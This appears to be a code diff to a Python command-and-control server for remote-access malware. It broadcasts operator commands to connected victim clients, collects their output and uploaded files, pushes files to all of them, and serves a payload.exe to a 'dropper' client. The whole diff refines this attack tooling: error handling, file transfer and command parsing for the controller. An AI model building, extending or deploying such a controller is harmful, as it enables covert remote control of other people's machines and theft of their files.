@@ -10,11 +10,25 @@ class Server:
         self.clients = []           # list of connected client sockets
         self.clients_lock = threading.Lock()
 
+    # ------ Remove client from list ------
+    def remove_client(self, client_socket):
+        try:
+            with self.clients_lock:
+                if client_socket in self.clients:
+                    self.clients.remove(client_socket)
+                client_socket.close()
+        except Exception as e:
+            print(f"[-] Error closing client socket: {e}")
+
     # ------ Send message with length prefix ------
     def send_msg(self, sock, msg):
-        data = msg.encode('utf-8')
-        size = len(data).to_bytes(4, 'big')
-        sock.sendall(size + data)
+        try:
+            data = msg.encode('utf-8')
+            size = len(data).to_bytes(4, 'big')
+            sock.sendall(size + data)
+        except Exception as e:
+            print(f"[-] Error sending message to {sock.getpeername()}: {e}")
+            self.remove_client(sock)
 
     # ------ Receive exact bytes ------
     def recv_exact(self, sock, n):
@@ -32,6 +46,47 @@ class Server:
         size = int.from_bytes(size_bytes, 'big')
         data = self.recv_exact(sock, size)
         return data.decode('utf-8')
+    
+    # ------ Send and receive file ------
+    def send_file(self, sock, filename):
+        try:
+            if not os.path.exists(filename):
+                print(f"[-] File not found: {filename}")
+                return
+            print(f"[+] Sending {filename} to {sock.getpeername()}")
+            size = os.path.getsize(filename)
+            basename = os.path.basename(filename)
+            self.send_msg(sock, f"FILE:{basename}:{size}")
+            with open(filename, "rb") as f:
+                while True:
+                    chunk = f.read(4096)
+                    if not chunk:
+                        break
+                    sock.sendall(chunk)
+            print(f"[+] Sent {filename}")
+        except Exception as e:
+            print(f"[-] Failed to send {filename}: {e}")
+
+    # ------ Receive and save file ------
+    def recv_file(self, sock, header, addr, save_folder="."):
+        try: 
+            _, filename, filesize = header.split(":")
+            filesize = int(filesize)
+            filepath = os.path.join(save_folder, os.path.basename(filename))
+
+            print(f"[*] Receiving {filename} from {addr}...")
+            with open(filepath, "wb") as f:
+                remaining = filesize
+                while remaining > 0:
+                    chunk = sock.recv(min(4096, remaining))
+                    if not chunk:
+                        raise ConnectionError("connection closed during file transfer")
+                    f.write(chunk)
+                    remaining -= len(chunk)
+        except Exception as e:
+            print(f"[-] Error receiving file from {addr}: {e}")
+            return
+        print(f"[+] File saved as server_{filepath}")
 
     # ------ Handle one client ------
     def client_handler(self, client_socket, addr):
@@ -52,10 +107,10 @@ class Server:
                     except FileNotFoundError:
                         print("[-] Error: payload.exe not found on server.")
                     return # Dropper disconnects after download
-
+                
                 # --- Handle File Download from Client ---
                 if msg.startswith("FILE:"):
-                    self.handle_file_download(client_socket, msg, addr)
+                    self.recv_file(client_socket, msg, addr)
                     continue
 
                 print(f"\n--- Output from {addr} ---")
@@ -63,19 +118,8 @@ class Server:
                 print("--------------------------")
             except ConnectionError:
                 print(f"[-] Client disconnected: {addr}")
-                with self.clients_lock:
-                    self.clients.remove(client_socket)
-                client_socket.close()
+                self.remove_client(client_socket)
                 break
-
-    def handle_file_download(self, sock, header, addr):
-        _, filename, filesize = header.split(":")
-        filesize = int(filesize)
-        print(f"[*] Receiving {filename} ({filesize} bytes) from {addr}...")
-        data = self.recv_exact(sock, filesize)
-        with open(f"server_{filename}", "wb") as f:
-            f.write(data)
-        print(f"[+] File saved as server_{filename}")
 
     # ------ Main server loop ------
     def start(self):
@@ -100,26 +144,28 @@ class Server:
     # ------ Input loop to send commands ------
     def command_input_loop(self):
         while True:
-            cmd = input("Command > ")
+            cmd = input("Command > ").strip()
 
-            if not cmd.strip():
+            if not cmd:
                 continue
 
             # --- Handle File Upload to Client (put) ---
-            if cmd.startswith("put "):
+            if cmd.startswith("send_file "):
                 try:
-                    filename = cmd.split()[1]
+                    filename = cmd[10:].strip()
                     if not os.path.exists(filename):
                         print(f"[-] File {filename} not found.")
                         continue
-                    with open(filename, "rb") as f:
-                        file_data = f.read()
-                    cmd = f"put {filename} {len(file_data)}" # Update cmd to include size
                 except Exception as e:
                     print(f"Error preparing file: {e}")
                     continue
-            else:
-                file_data = None
+                with self.clients_lock:
+                    if not self.clients:
+                        print("No connected clients.")
+                        continue
+                    for sock in self.clients:
+                        threading.Thread(target=self.send_file, args=(sock, filename), daemon=True).start()
+                continue
 
             with self.clients_lock:
                 if not self.clients:
@@ -129,8 +175,6 @@ class Server:
                 for sock in self.clients:
                     try:
                         self.send_msg(sock, cmd)
-                        if file_data:
-                            sock.sendall(file_data)
                     except:
                         print("Failed to send command to a client.")
 if __name__ == "__main__":
